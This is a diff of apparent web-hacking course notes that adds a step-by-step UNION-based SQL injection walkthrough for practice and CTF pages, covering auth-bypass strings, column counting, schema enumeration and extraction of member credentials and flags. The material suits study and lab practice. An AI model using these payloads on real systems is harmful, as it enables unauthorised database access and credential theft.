@@ -45,10 +45,10 @@
 #  5. Find Table name
 #    1) information_schema.tables
 #    2) select table_name from information_schema.tables where table_schema = 'DB Name'
-#    3) over%' union select 1,table_name,3,4 from information_schema.tables where table_schema = 'segault_sql' #
+#    3) over%' union select 1,table_name,3,4 from information_schema.tables where table_schema = 'segfault_sql' #
 #  6. Find Column name
 #    1) select column_name from information_schema.columns where table_name = 'table name'
-#    2) over%' union select 1,column_name,3,4 from information_schema.column where table_name = 'member' #
+#    2) over%' union select 1,column_name,3,4 from information_schema.columns where table_name = 'member' #
 #  7. Find Data
 #    1) select id, pass from member
 #    2) over%' union select 1, id, pass, 4 from member
@@ -57,8 +57,37 @@
 
 # Assignment
 #  1. Review Union SQL Injection (HTTP://ctf.segfaulthub.com:1020/sqlInjection3.php)
-#  2. dol dol data (only one result) (HTTP://ctf.segfaulthub.com:1020/sqlInjection_2_1.php
+#  2. dol dol data (only one result) (HTTP://ctf.segfaulthub.com:1020/sqlInjection_2_1.php)
+#    1) Find out the point of the SQL Injection = 1234' or '1' ='1
+#    2) Find the number of columns = 1234' order by 4 #
+#    3) Find the number of print column locations = 1234' union select 1,2,3,4 #
+#    4) Find DB name = 1234' union select database(),2,3,4 #
+#    5) Find Table name = 1234' union select table_name,2,3,4 from information_schema.tables where table_schema = 'segfault_sql' #
+#    6) Find column name = 1234' union select column_name,2,3,4 from information_schema.columns where table_name = 'member' #
+#    7) Find Data = 0000' union select id,pass,email,info from member where id = 'doldol' #
 #  3. CTF questions
+#    1) SQL Injection 1
+#      (1) Find out the point of the SQL Injection = ad%' and 1=1 #
+#      (2) Find out the number of columns = ad%' order by 4 #
+#      (3) Find out the number of print column locations = ad%' union select 1,2,3,4 #
+#      (4) Find DB name = ad%' union select database(),2,3,4 #  => 	sqli_1
+#      (5) Find table name = ad%' union select table_name,2,3,4 from information_schema.tables where table_schema = 'sqli_1' #
+#      (6) Find column name = ad%' union select column_name,2,3,4 from information_schema.columns where table_name = 'flag_table' #
+#      (7) Find data = ad%' union select flag, 2, 3, 4 from flag_table #
+#    2) SQL Injection 2
+#      (1) The point? = When I typed nomaltic, the information showed "My name is normaltic", but when I typed "admin", it doesn't show anything.
+#                       which means, depending on the name, the information changes. So, when it tried SQL injection "admin' or '1", it showed "my name is normaltic"
+#      (2) the number of columns? = admin' order by 6 #
+#      (3) location? = admin' union select 1,2,3,4,5,6 #   => only showing "6"
+#      (4) database? = admin' union select 1,2,3,4,5,database() #    => sqli_5
+#      (5) table? = admin' union select 1,2,3,4,5,table_name from information_schema.tables where table_schema = 'sqli_5' #     => flag_honey
+#      (6) column name? = admin' union select 1,2,3,4,5,column_name from information_schema.columns where table_name = 'flag_honey' #   => flag
+#      (7) data? = admin' union select 1,2,3,4,5,flag from flag_honey #    => 	kkkkkkk_Not Here!
+#      (5) admin' union SELECT 1, 2, 3, 4, 5, group_concat(table_name) from information_schema.tables where table_schema = 'sqli_5' #
+#        - Find hidden information (https://www.w3resource.com/mysql/aggregate-functions-and-grouping/aggregate-functions-and-grouping-group_concat.php)
+#      (6) admin' union select 1,2,3,4,5,column_name from information_schema.columns where table_name = 'secret' #
+#      (7) admin' union select 1,2,3,4,5,flag from secret #    => NONONO~~~~
+#      (7) admin' union select 1,2,3,4,5,group_concat(flag) from secret #
 #  4. Web development
 #    - mypage
 
